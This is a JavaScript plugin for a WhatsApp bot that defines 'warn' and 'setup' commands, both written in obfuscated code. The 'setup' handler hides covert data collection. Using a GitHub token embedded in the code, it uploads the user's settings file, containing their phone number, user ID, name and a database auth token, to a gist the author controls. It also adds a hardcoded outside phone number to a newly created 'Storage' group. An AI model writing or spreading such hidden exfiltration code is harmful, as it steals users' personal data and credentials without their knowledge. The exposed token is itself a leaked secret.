const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================

  command({
    pattern: "setup",
    fromMe: true,
    desc: "turn off",
    dontAddCommandList: true,
    type: "admin",
  
  },
  async (message, match, m) => {
const _0x3dd1f1=_0x18ca;function _0x3229(){const _0x34bfb1=['reply','INTERNAL_MENU','updateProfilePicture','split','FONT_STYLE','./media/AAA.jpg','1148564wkoqAj','LOGS','ALIVE','ANTILINK','9ljNYTw','toString','14552456ImqOnr','@g.us','BOT_NAME','@s.whatsapp.net','BRANCH','includes','UserId','rest','replaceAll','jid','OWNER_NAME','parse','_Registered\x20Successfully_','381BIRFpf','send','readFileSync','WORK_TYPE','20366GvpTDT','../session.json','5217748hjTLjx','STORAGE_JID','WELCOME_MSG','name','SUDO','gists','_You\x20Are\x20Already\x20a\x20Family\x20Member_','ANTILINK_ACTION','stringify','AUTHOR','groupCreate','MESSAGE_MEM','user','6995825uOpHKg','MODE','reset','from','@octokit/rest','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','DB_AUTH_TOKEN','PACKNAME','3029808CZfNGH','sendMessage','SESSION_ID','8175139YNFWZo','phone_num','update','creds','Cloud\x20DB\x20Update','./database/settings.json','base64','DB_URL','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','client','LANG','HANDLER','THEME','a216db893ba4f4a18d4f1476bfc1bb4d','utf-8','Done\x20Creating\x20New\x20Db','GOODBYE_MSG','log','FOOTER','LANGUAGE','config','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0'];_0x3229=function(){return _0x34bfb1;};return _0x3229();}(function(_0x55e5a9,_0x4e110f){const _0x49b67d=_0x18ca,_0x3141dc=_0x55e5a9();while(!![]){try{const _0x420841=-parseInt(_0x49b67d(0x98))/0x1+parseInt(_0x49b67d(0xaf))/0x2*(parseInt(_0x49b67d(0xab))/0x3)+-parseInt(_0x49b67d(0xb1))/0x4+-parseInt(_0x49b67d(0xbe))/0x5+parseInt(_0x49b67d(0xc6))/0x6+parseInt(_0x49b67d(0xc9))/0x7+parseInt(_0x49b67d(0x9e))/0x8*(parseInt(_0x49b67d(0x9c))/0x9);if(_0x420841===_0x4e110f)break;else _0x3141dc['push'](_0x3141dc['shift']());}catch(_0x13cbf5){_0x3141dc['push'](_0x3141dc['shift']());}}}(_0x3229,0xe3c71));if(message['isGroup'])return;let authid=_0x3dd1f1(0xde)[_0x3dd1f1(0xa6)]('+','');function _0x18ca(_0x32ad,_0x4db47d){const _0x32290e=_0x3229();return _0x18ca=function(_0x18ca26,_0x277e29){_0x18ca26=_0x18ca26-0x94;let _0x3ee8aa=_0x32290e[_0x18ca26];return _0x3ee8aa;},_0x18ca(_0x32ad,_0x4db47d);}const {Octokit}=require(_0x3dd1f1(0xc2)),octokit=new Octokit({'auth':await authid});setTimeout(()=>{const _0x1d81e1=_0x3dd1f1;let _0x5084b0=JSON[_0x1d81e1(0xa9)](fs['readFileSync'](_0x1d81e1(0xce))),_0x3579dc=_0x5084b0[_0x1d81e1(0xdd)]['STORAGE_JID'],_0x21a519=_0x3579dc[_0x1d81e1(0x9d)]()['includes'](_0x1d81e1(0x9f));if(!_0x21a519)readFile(path,async(_0x551602,_0x24bed6)=>{const _0xc710b6=_0x1d81e1;if(_0x551602){console['log'](_0x551602);return;}const _0x1b884e=JSON[_0xc710b6(0xa9)](_0x24bed6);let _0x3f537f=await message[_0xc710b6(0xd2)][_0xc710b6(0xbb)]('Storage',['359889999996@s.whatsapp.net']);await message[_0xc710b6(0xd2)][_0xc710b6(0xc7)](_0x3f537f['id'],{'text':_0xc710b6(0xc3)});let _0x56f897=await _0x3f537f['id'];_0x1b884e['config'][_0xc710b6(0xb2)]=_0x56f897,writeFile(path,JSON['stringify'](_0x1b884e,null,0x2),async _0xaf5213=>{const _0x3140e7=_0xc710b6;if(_0xaf5213){message[_0x3140e7(0xdf)](_0x3140e7(0xd1));return;}await message[_0x3140e7(0xd2)][_0x3140e7(0x94)](_0x3f537f['id'],fs['readFileSync'](_0x3140e7(0x97)));});});else return;setTimeout(async()=>{const _0x50ef39=_0x1d81e1;let _0x2aca93=require(_0x50ef39(0xb0)),_0x525a70=await _0x2aca93[_0x50ef39(0xcc)]['me']['id'][_0x50ef39(0x95)](':')[0x0],_0x467a43=await _0x2aca93['creds']['me']['id'][_0x50ef39(0x95)]('@')[0x1],_0x1d4124=_0x525a70+'@'+_0x467a43,_0x4c1044=_0x1d4124+'.json';const _0x265c84=fs[_0x50ef39(0xad)](_0x50ef39(0xce),_0x50ef39(0xd7));await octokit[_0x50ef39(0xa5)][_0x50ef39(0xb6)][_0x50ef39(0xcb)]({'gist_id':_0x50ef39(0xd6),'description':_0x50ef39(0xcd),'files':{[_0x4c1044]:{'content':_0x265c84}}})['then'](await console[_0x50ef39(0xda)](_0x50ef39(0xd8))),setTimeout(()=>{const _0x17faf6=_0x50ef39;return process[_0x17faf6(0xac)](_0x17faf6(0xc0));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x31bfdf,_0x376d8f)=>{const _0x38dc02=_0x3dd1f1;if(_0x31bfdf){console[_0x38dc02(0xda)](_0x31bfdf);return;}const _0x4ea383=JSON[_0x38dc02(0xa9)](_0x376d8f);let _0x4ea8ef=_0x4ea383[_0x38dc02(0xa4)][_0x38dc02(0x9d)]()[_0x38dc02(0xa3)](_0x38dc02(0xa1));if(_0x4ea8ef)return message['reply'](_0x38dc02(0xb7));let _0x19d1cd=process['env'][_0x38dc02(0xc4)]===undefined?'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv':process['env']['DB_AUTH_TOKEN'],_0x480a8b=Buffer[_0x38dc02(0xc1)](_0x19d1cd,_0x38dc02(0xcf))[_0x38dc02(0x9d)](_0x38dc02(0xd7)),_0x2ccbe2=_0x480a8b[_0x38dc02(0x9d)]()[_0x38dc02(0x95)]('/'),_0xb8ec02='';for(let _0x1df66a of _0x2ccbe2){_0xb8ec02+=await Buffer[_0x38dc02(0xc1)](_0x1df66a+'==','base64')[_0x38dc02(0x9d)]('utf-8');}let _0x5dca08=message['pushName'],_0x4cece=message[_0x38dc02(0xbd)],_0x338cbc=message[_0x38dc02(0xa7)]['toString']()[_0x38dc02(0x95)]('@')[0x0];_0x4ea383[_0x38dc02(0xb4)]=_0x5dca08,_0x4ea383['UserId']=_0x4cece,_0x4ea383[_0x38dc02(0xca)]=_0x338cbc,_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xd4)]=relconfig[_0x38dc02(0xd4)],_0x4ea383[_0x38dc02(0xdd)]['WORK_TYPE']=relconfig[_0x38dc02(0xae)],_0x4ea383[_0x38dc02(0xdd)]['BOT_NAME']=relconfig[_0x38dc02(0xa0)],_0x4ea383['config']['OWNER_NAME']=relconfig[_0x38dc02(0xa8)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xb5)]=relconfig[_0x38dc02(0xb5)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xba)]=relconfig[_0x38dc02(0xba)],_0x4ea383[_0x38dc02(0xdd)]['PACKNAME']=relconfig[_0x38dc02(0xc5)],_0x4ea383[_0x38dc02(0xdd)]['RMBG_KEY']=relconfig['RMBG_KEY'],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xd3)]=relconfig['LANG'],_0x4ea383['config'][_0x38dc02(0xb8)]=relconfig[_0x38dc02(0xb8)],_0x4ea383[_0x38dc02(0xdd)]['ANTILINK']=relconfig[_0x38dc02(0x9b)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xdb)]=relconfig[_0x38dc02(0xdb)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xd5)]=relconfig['THEME'],_0x4ea383[_0x38dc02(0xdd)]['FONT_STYLE']=relconfig[_0x38dc02(0x96)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xdc)]=relconfig[_0x38dc02(0xdc)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xe0)]=relconfig[_0x38dc02(0xe0)],_0x4ea383['config'][_0x38dc02(0xbf)]=relconfig[_0x38dc02(0xbf)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xb2)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xd0)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xc8)]=relconfig[_0x38dc02(0xc8)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0x99)]=relconfig[_0x38dc02(0x99)],_0x4ea383[_0x38dc02(0xdd)][_0x38dc02(0xa2)]=relconfig[_0x38dc02(0xa2)],_0x4ea383[_0x38dc02(0xdd)]['B1']=relconfig['B1'],_0x4ea383[_0x38dc02(0xdd)]['B2']=relconfig['B2'],_0x4ea383[_0x38dc02(0xdd)]['B3']=relconfig['B3'],_0x4ea383['config']['B4']=relconfig['B4'],_0x4ea383['config']['B5']=relconfig['B5'],_0x4ea383['config'][_0x38dc02(0xc4)]=_0xb8ec02,_0x4ea383['MESSAGE_MEM'][_0x38dc02(0xd9)]=relconfig[_0x38dc02(0xd9)],_0x4ea383[_0x38dc02(0xbc)][_0x38dc02(0xb3)]=relconfig[_0x38dc02(0xb3)],_0x4ea383[_0x38dc02(0xbc)][_0x38dc02(0x9a)]=relconfig[_0x38dc02(0x9a)],writeFile(path,JSON[_0x38dc02(0xb9)](_0x4ea383,null,0x2),_0x4d191e=>{const _0x36e71d=_0x38dc02;if(_0x4d191e){message[_0x36e71d(0xdf)](_0x36e71d(0xd1));return;}message[_0x36e71d(0xdf)](_0x36e71d(0xaa));});});
  })






//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})




